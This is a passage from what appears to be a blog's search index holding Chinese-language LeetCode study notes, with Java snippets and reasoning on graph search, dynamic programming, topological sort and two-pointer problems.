class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[][] matrix,<span class="type">int</span> target,<span class="type">int</span> i,<span class="type">int</span> j)</span></span><br><span class="line">    当matrix[i][j]&gt;target时返回<span class="literal">false</span>；当matrix[i][j]==target时返回<span class="literal">true</span>；</span><br><span class="line">    当matrix[i][j]&lt;target时，在边界条件下，设置right、down初值为<span class="literal">false</span>，向右侧、下方两个方向调用dfs，<span class="keyword">return</span> right||down。</span><br><span class="line">但遗憾的是，超过了时间限制。</span><br><span class="line"><span class="number">2.</span>我的想法，二分查找。试想最暴力的解法，双层<span class="keyword">for</span>循环遍历每行每列。题目中每行是从小到大排列的，此时就可以用二分查找降低时间复杂度。二分查找的实现是经典代码，找到返回mid，找不到返回-<span class="number">1</span>。</span><br></pre></td></tr></table></figure><h2 id="581、最短无序连续子数组（12月1日）"><a href="#581、最短无序连续子数组（12月1日）" class="headerlink" title="581、最短无序连续子数组（12月1日）"></a>581、最短无序连续子数组（12月1日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，双指针+排序。可以先将数组nums备份一份为arr，将arr从小到大排序，然后从左到右、从右到左两次扫描nums和arr，两次遇到第一个不同的元素索引分别为i、j，arr数组的[i,j]区间内即为我们要找的元素。</span><br><span class="line"><span class="keyword">while</span>(left&lt;=right&amp;&amp;nums[left]==arr[left]) left++;   <span class="comment">//从左到右扫描</span></span><br><span class="line">因为当相等时跳出循环，总会right-left=-<span class="number">1</span>，故返回（right-left+<span class="number">1</span>）是正确的。甚至可以认为，不管怎样都应该有唯一公式。</span><br></pre></td></tr></table></figure><h2 id="207、课程列表（12月2日）"><a href="#207、课程列表（12月2日）" class="headerlink" title="207、课程列表（12月2日）"></a>207、课程列表（12月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，拓扑排序。大约十天前做过，知道用拓扑排序，看了下拓扑排序的性质，很快就做出来了。这道题和前面的题不同，这里返回是否存在<span class="type">boolean</span>，前面是返回课程顺序，故只需要维护result=<span class="number">0</span>，每当queue弹出节点时，就将result增加<span class="number">1</span>，最后返回<span class="type">boolean</span>值result==numCourses。</span><br><span class="line"><span class="comment">//拓扑排序材料：入度degrees，出边hashMap&lt;Integer,List&lt;Integer&gt;，queue入度0</span></span><br><span class="line">    题目条件就是“选修某些课程之前需要一些先修课程”，显然是有向无环图，肯定用拓扑排序没错。</span><br></pre></td></tr></table></figure><h2 id="200、岛屿数量（12月2日）"><a href="#200、岛屿数量（12月2日）" class="headerlink" title="200、岛屿数量（12月2日）"></a>200、岛屿数量（12月2日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，图广度优先遍历。这道题很奇怪，原本以为做过，还是图BFS的经典模板题，但发现没这么简单，以前做过的是岛屿的最大面积。奇怪的点是，我用visited数组判断是否访问过会超时，题解用的是“灌水法【笑哭】”。</span><br><span class="line">    灌水法：就是不再设置visited数组，而是直接将该点grid值从<span class="string">&#x27;1&#x27;</span>改为<span class="string">&#x27;0&#x27;</span>。且题解先将点加入queue，取出时若合法且为<span class="string">&#x27;1&#x27;</span>，才将上下左右节点放入queue，但不会对其判断是否合法、是否为<span class="string">&#x27;1&#x27;</span>，但实在分析不出能有啥提升？</span><br><span class="line">    <span class="comment">//图BFS的材料：visited数组，四个方向，越界判断</span></span><br><span class="line">    此外要注意，grid是<span class="type">char</span>数组，如果写成grid[row][column]==<span class="number">1</span>判断不会报错，很难发现该错误，记得<span class="string">&#x27;1&#x27;</span>。</span><br></pre></td></tr></table></figure><h2 id="75、颜色分类（12月3日）"><a href="#75、颜色分类（12月3日）" class="headerlink" title="75、颜色分类（12月3日）"></a>75、颜色分类（12月3日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，双指针。这道题显然要维护双指针，根据left指针的数值分情况讨论，再看right指针的数值决定是否交换。问题是，不知道跳出循环的条件是啥。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，双指针。指针p0用来交换<span class="number">0</span>，指针p1用来交换<span class="number">1</span>。这道题真鸡儿难想，不知道是不是状态不好。因为目标是把nums数组分为<span class="number">0</span>、<span class="number">1</span>，<span class="number">2</span>三段，从左往右遍历的同时，要记住两个分界线，<span class="number">0</span>和<span class="number">1</span>的分界线，<span class="number">1</span>和<span class="number">2</span>的分界线，这里定义的双指针就是这个目的。从左往右遍历时，</span><br><span class="line">    如果找到<span class="number">1</span>，就将其与nums[i]交换，并将p1向后移动；</span><br><span class="line">    如果找到<span class="number">0</span>，就将其与nums[i]交换，并将p0向后移动；但是如果此时p0&lt;p1，说明nums[i]为<span class="number">1</span>被交换到了前面p0的位置，因此要交换i和p1，并将p1向后移动。</span><br><span class="line"><span class="number">3.</span>不想了，脑壳痛。只能想到，p1不管nums[i]是<span class="number">0</span>还是<span class="number">1</span>，它都在移动肯定比p0快。</span><br></pre></td></tr></table></figure><h2 id="221、最大正方形（12月3日）"><a href="#221、最大正方形（12月3日）" class="headerlink" title="221、最大正方形（12月3日）"></a>221、最大正方形（12月3日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，图BFS。两次想到图BFS，发现最后都不是用图BFS，TMD。做不下去是因为，不知道该怎样取出子图中的正方形。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，动态规划。设dp[i][j]表示（i，j）为右下角，且只包含<span class="number">1</span>的正方形的边长最大值。则</span><br><span class="line">    如果该位置值为<span class="number">0</span>，dp[i][j]=<span class="number">1</span>;</span><br><span class="line">如果该位置值为<span class="number">1</span>，dp[i][j] = min(dp[i-<span class="number">1</span>][j],dp[i][j-<span class="number">1</span>],dp[i-<span class="number">1</span>][j-<span class="number">1</span>])+<span class="number">1</span>;</span><br><span class="line">特殊情况，最左面和最上面的边dp值最多只能为<span class="number">1</span>。</span><br><span class="line">    此外，注意matrix[i][j]==<span class="string">&#x27;1&#x27;</span>，输入时<span class="type">char</span>型数组，而不是<span class="type">int</span>型数组，经常会犯这个错误。</span><br></pre></td></tr></table></figure><h2 id="79、单词搜索（12月4日）"><a href="#79、单词搜索（12月4日）" class="headerlink" title="79、单词搜索（12月4日）"></a>79、单词搜索（12月4日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>，我的想法，图DFS。这道题还是比较简单的，标准的图遍历代码。定义dfs函数如下，dfs函数逻辑还是在四个方向遍历，如果遇到没访问的字母且和index位置的字符相等，则进入dfs(board,word,builder,visited,row,column,index+<span class="number">1</span>)，dfs返回<span class="literal">false</span>时会进行回溯，重新从StringBuilder中删除该字符，且将该字符visited设置为未访问。当index到达word.length()时，即为边界条件，返回<span class="literal">true</span>。</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">dfs</span><span class="params">(<span class="type">char</span>[][] board, String word, StringBuilder builder,<span class="type">boolean</span>[][] visited,<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> index)</span></span><br><span class="line">    <span class="comment">//图BFS的材料：visited数组，四个方向，越界判断</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>本来准备通过hashSet实现visited数组的功能，但发现有错误。即不可以通过新实例在hashSet中查找：</span><br><span class="line">    HashSet&lt;<span class="type">int</span>[]&gt; hashSet = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">    hashSet.add(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>,<span class="number">1</span>&#125;);</span><br><span class="line">    System.out.println(hashSet.contains(<span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>,<span class="number">1</span>&#125;));  <span class="comment">//返回false</span></span><br></pre></td></tr></table></figure><h2 id="279、完全平方数（12月4日）"><a href="#279、完全平方数（12月4日）" class="headerlink" title="279、完全平方数（12月4日）"></a>279、完全平方数（12月4日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。设dp[i]表示和为i的完全平方数的最少数量，为了求和为n的，故定义dp数组长度为（n+<span class="number">1</span>），dp[<span class="number">0</span>]=<span class="number">0</span>。显然有dp[<span class="number">1</span>]=<span class="number">1</span>、dp[<span class="number">2</span>]=<span class="number">2</span>、dp[<span class="number">3</span>]=<span class="number">3</span>、dp[<span class="number">4</span>]=<span class="number">1</span>(<span class="number">4</span>)、dp[<span class="number">5</span>]=<span class="number">2</span>(<span class="number">4</span>+<span class="number">1</span>);</span><br><span class="line">故对于dp[i]，所有小于i的完全平方数k*k，补齐剩余部分dp[i-k*k]，即dp[i]=<span class="number">1</span>+dp[i-k*k]，取其中和最小的。</span><br><span class="line">dp[i] = Math.min(dp[i],<span class="number">1</span>+dp[i-j*j]);</span><br><span class="line">将dp[i]初值设为i，表示i是通过<span class="number">1</span>累加得到的，这是最坏的情况，从而能通过min更新dp[i]，否则初值为<span class="number">0</span>则不可更新。</span><br><span class="line"> <span class="number">2.</span>这个状态转移公式比较难想，原因在dp[i]是通过遍历得到的，一般觉得动态规划涉及遍历就有问题。</span><br></pre></td></tr></table></figure><h2 id="494、目标和（12月5日）"><a href="#494、目标和（12月5日）" class="headerlink" title="494、目标和（12月5日）"></a>494、目标和（12月5日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，回溯法。这道题竟然用回溯直接通过了，每步考虑加减即可，dfs函数设计如下：</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">dfs</span><span class="params">(<span class="type">int</span>[] nums,<span class="type">int</span> target,<span class="type">int</span> i,<span class="type">int</span> sum,<span class="type">int</span>[] result)</span></span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，动态规划。背包问题。 先不看。</span><br></pre></td></tr></table></figure><h2 id="96、不同的二叉搜索树（12月21日）"><a href="#96、不同的二叉搜索树（12月21日）" class="headerlink" title="*96、不同的二叉搜索树（12月21日）"></a>*96、不同的二叉搜索树（12月21日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。没啥想说的了，勾八笛卡尔积和数学规律，我说十月多咋一段时间没刷题，原来就是你小子搞得鬼！</span><br></pre></td></tr></table></figure><h2 id="437、路径总和Ⅲ（12月22日）"><a href="#437、路径总和Ⅲ（12月22日）" class="headerlink" title="437、路径总和Ⅲ（12月22日）"></a>437、路径总和Ⅲ（12月22日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，深度优先搜索。脑子里全是栈实现二叉树遍历，很复杂哭惹，没想到是DFS。这道题用了两层DFS，首先要考虑以每个node为起点，从上到下遍历时进行DFS，其次以每个node为起点时，对不同的路径进行DFS。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">2</span>，前缀和。维护Map&lt;Long,Integer&gt; prefix保存路径上累积的前缀和，通过dfs从上到下先序遍历二叉树时，先在sum上加上node.val，在前缀和表prefix中查找值等于（sum-target）的前缀次数。</span><br><span class="line">    在prefix上累加键sum一次，递归遍历左右子节点，当返回结果时，从prefix上减掉sum一次，表示当前路径已从该点向上收缩，不再需要该点的前缀和。</span><br></pre></td></tr></table></figure><h2 id="416、分割等和子集（1月10日）"><a href="#416、分割等和子集（1月10日）" class="headerlink" title="416、分割等和子集（1月10日）"></a>416、分割等和子集（1月10日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>思路<span class="number">1</span>，动态规划。这道题做过了，第二次整还是挺难的。定义dp[i][j]表示从i个数字中选取若干数，使得这若干数的和为j。定义dp[nums.length][target+<span class="number">1</span>]。</span><br><span class="line">a.求maxNum，求sum，target=sum/<span class="number">2</span>，如果sum%<span class="number">2</span>!=<span class="number">0</span>、maxNum&gt;target，就直接返回<span class="literal">false</span>；</span><br><span class="line">b.定义dp[nums.length][target+<span class="number">1</span>]，初始化dp[任意位][<span class="number">0</span>]为<span class="literal">true</span>（表示不选），dp[<span class="number">0</span>][nums[<span class="number">0</span>]]为<span class="literal">true</span>。</span><br><span class="line">c.通过双层<span class="keyword">for</span>(<span class="number">1</span>)循环遍历dp，在j&gt;=nums[i]时，dp[i][j]来自两部分，小于时来自一部分。</span><br></pre></td></tr></table></figure><h2 id="322、零钱兑换（1月12日）"><a href="#322、零钱兑换（1月12日）" class="headerlink" title="322、零钱兑换（1月12日）"></a>322、零钱兑换（1月12日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，动态规划。定义dp[i]，表示组成金额i所需的最小硬币数目，dp[<span class="number">0</span>]为<span class="number">0.</span>从<span class="number">1</span>到amount遍历金额，每轮再遍历不同面额的硬币coin，通过dp[i-coin]+<span class="number">1</span>更新当前金额所需硬币的最小值。结果<span class="keyword">return</span> dp[amount]==Integer.MAX_VALUE?-<span class="number">1</span>:dp[amount];</span><br><span class="line"><span class="number">2.</span>题解中，将Integer.MAX_VALUE替换为amount+<span class="number">1</span>，硬币数目不会超过该值，从而省略对越界的判断。</span><br></pre></td></tr></table></figure><h2 id="621、任务调度器（1月13日）"><a href="#621、任务调度器（1月13日）" class="headerlink" title="621、任务调度器（1月13日）"></a>621、任务调度器（1月13日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>我的想法，找规律。我以为我很聪明，维护taskCount统计词频，维护taskIndex记录最小索引，每轮遍历时取出满足要求的、历史索引最小的任务占据该位置，然而这种思路并不正确。悄咪咪看了眼题解，题解超复杂，但看到了句“找出剩余次数最多的任务”，据此对代码略加修改就通过了，我棒得不彻底。（关键词，剩余次数最多得任务）</span><br></pre></td></tr></table></figure><h2 id="647、回文子串（2月13日）"><a href="#647、回文子串（2月13日）" class="headerlink" title="647、回文子串（2月13日）"></a>647、回文子串（2月13日）</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span>题解说，如果遍历子串再判断是否为回文，时间复杂度为O(n^<span class="number">3</span>)；另一种方式，遍历回文中心复杂度为O(n),再向外扩展复杂度为O(n)，这种方式的时间复杂度总和为O(n^<span class="number">2</span>)，官方题解有点难理解，直接看了评论区大哥的实现。</span><br><span class="line"><span class="number">2.</span>思路<span class="number">1</span>，遍历回文中心。从左到右遍历字符串，对每个位置字符作为回文中心而言，会存在两种情况：a.该位置作为回文中心，回文串长度为奇数；b.该位置和下一位置共同组成回文中心，回文串长度为偶数。写法如下，需要注意不能越界：</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">1</span>;j++)</span><br><span class="line"> <span class="type">int</span> <span class="variable">left</span> <span class="operator">=</span> i,right = i+j;</span><br><span class="line">          <span class="keyword">while</span>(left&gt;=<span class="number">0</span>&amp;&amp;right&lt;=len-<span class="number">1</span>&amp;&amp;s.charAt(left)==s.charAt(right)) &#123; <span class="comment">//向两边扩展 &#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> LeetCode </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
